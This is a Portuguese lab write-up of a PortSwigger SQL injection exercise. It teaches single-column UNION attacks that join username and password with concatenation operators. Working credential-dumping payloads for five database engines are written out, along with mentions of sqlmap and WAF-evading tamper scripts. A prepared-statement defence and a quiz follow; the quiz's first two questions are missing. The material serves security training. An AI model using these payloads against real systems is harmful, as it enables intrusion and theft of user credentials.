## 🎬 O Desafio

> Este laboratório contém uma vulnerabilidade de SQL Injection no filtro de busca de categoria. Os resultados da consulta são retornados na tela, então você pode usar um ataque **UNION** para recuperar dados de outras tabelas.
>
> **Tabela alvo:** `users` (colunas `username` e `password`).
>
> **Missão:** Recuperar todos os usernames e senhas e fazer login como administrador.

### 🚧 A pegadinha deste lab

Diferente de [59.md](59.md), onde a query original tinha **2 colunas visíveis**, agora a aplicação **só mostra 1 coluna** (apenas o nome do produto). Como você vai trazer **2 valores** (`username` + `password`) em **1 coluna apenas**?

### O problema deste desafio

```
Query original retorna: [name]                    ← 1 coluna
Você precisa extrair:  [username] + [password]    ← 2 valores

UNION exige: mesmo número de colunas ✋
```

**Resposta:** se você só pode trazer **1 coluna**, **junte os 2 valores numa string só** usando **concatenação SQL**.

---

## 🔧 Operadores de Concatenação por SGBD

Esta é a **informação crítica** que você precisa para o desafio:

| SGBD | Operador | Exemplo |
|------|----------|---------|
| **PostgreSQL** | `\|\|` (dois pipes) | `'Olá ' \|\| 'mundo'` → `Olá mundo` |
| **Oracle** | `\|\|` (dois pipes) | `'Olá ' \|\| 'mundo'` → `Olá mundo` |
| **SQLite** | `\|\|` (dois pipes) | `'Olá ' \|\| 'mundo'` → `Olá mundo` |
| **MySQL** | `CONCAT(a, b)` ou `' '` (espaço) | `CONCAT('Olá ', 'mundo')` → `Olá mundo` |
| **MS SQL Server** | `+` (mais) | `'Olá ' + 'mundo'` → `Olá mundo` |

> 💡 **Como descobrir qual SGBD usar?** Olhe a mensagem de erro do lab anterior, use `sqlmap --fingerprint`, ou simplesmente teste o operador apropriado.
>
> **Para este lab da PortSwigger:** o banco é **PostgreSQL** → use `||`


### Por que `~` no meio?

Para **separar visualmente** o username da senha no output. Você pode usar qualquer separador (`:`, `-`, ` | `):

```sql
SELECT username || ':' || password FROM users--
-- Resultado: administrator:s3cr3tP@ssw0rd

SELECT username || ' | ' || password FROM users--
-- Resultado: administrator | s3cr3tP@ssw0rd
```

## 🎓 Conceitos Aprendidos

| Conceito | Definição |
|----------|-----------|
| **Single-column UNION** | UNION quando a query original tem **apenas 1 coluna** visível |
| **Concatenação SQL** | Juntar 2+ valores em uma só string usando operador específico do SGBD |
| **Operador `\|\|`** | Padrão ANSI SQL — PostgreSQL, Oracle, SQLite |
| **`CONCAT()`** | Função do MySQL (e disponível em outros SGBDs) |
| **Separador visual** | Caractere que não aparece em dados normais (`~`, `:`, `\|`) para parsear o resultado depois |
| **Multiple values in single column** | Técnica de "espremer" várias colunas em uma só |

## 🛠️ Variações por SGBD

A mesma técnica em diferentes bancos:

### PostgreSQL / Oracle / SQLite

```sql
' UNION SELECT username || ':' || password FROM users--
```

### MySQL

```sql
' UNION SELECT CONCAT(username, ':', password) FROM users--
-- ou (com espaço como separador implícito)
' UNION SELECT CONCAT_WS(':', username, password) FROM users--
```

### MS SQL Server

```sql
' UNION SELECT username + ':' + password FROM users--
```

### Combinando 3+ colunas

```sql
-- PostgreSQL
' UNION SELECT username || ':' || password || ':' || email FROM users--

-- MySQL
' UNION SELECT CONCAT(username, ':', password, ':', email) FROM users--
```

## 🛡️ Como Prevenir Este Ataque

A defesa é **a mesma** dos outros labs SQLi — não tem prevenção específica para concatenação, porque a concatenação só é possível quando **a injeção já é possível**:

```javascript
// ❌ Vulnerável (qualquer técnica funciona)
const query = `SELECT name FROM products WHERE category = '${category}'`;

// ✅ Seguro contra TODAS as variantes de SQLi
const [rows] = await db.execute(
  'SELECT name FROM products WHERE category = $1',
  [category]
);
```

> 🔑 **Defesa SQLi é uma só: prepared statements.** Não importa se o atacante usa UNION simples, UNION com concatenação, blind ou time-based — todas as variantes precisam de **concatenação no servidor** para existir.

3. Por que usar um separador como `~` ou `:` no meio da concatenação?
4. Se a tabela `users` tivesse 5 colunas (username, password, email, role, last_login), como você as extrairia todas em uma coluna só (PostgreSQL)?
5. A defesa contra concatenação UNION é diferente da defesa contra login bypass do [57.md](57.md)?

<details>
<summary>Ver respostas</summary>

1. Porque `UNION SELECT *` traria **2 colunas** (`username`, `password`), mas a query original só tem **1 coluna**. UNION exige número idêntico de colunas
2. **MySQL:** `CONCAT(a, b)` ou `CONCAT_WS(':', a, b)`. **MS SQL Server:** `a + b` (operador `+`)
3. Para **separar visualmente** os valores no resultado. Sem separador, `adminpassword` poderia ser ambíguo (onde termina o username?)
4. `username || ':' || password || ':' || email || ':' || role || ':' || last_login`
5. **Não.** A defesa é a mesma: **prepared statements**. SQLi é uma única classe de vulnerabilidade; as "variantes" são apenas técnicas de exploração

</details>

## 💡 Reflexão Final

> *"O atacante criativo não desiste quando o caminho fica estreito —*
> *ele adapta a técnica ao contexto.*
>
> *Só tem 1 coluna disponível? Concatena.*
> *A coluna é numérica? Faz CAST.*
> *O servidor não retorna nada? Usa blind ou time-based.*
> *O WAF bloqueia 'UNION'? Usa tamper script.*
>
> *Cada limitação técnica vira um novo capítulo da exploração.*
> *É por isso que SQLi continua aparecendo no Top 10 da OWASP 25 anos depois."*

> 🔑 **A complexidade do atacante é infinita. A defesa é sempre a mesma: prepared statements.**
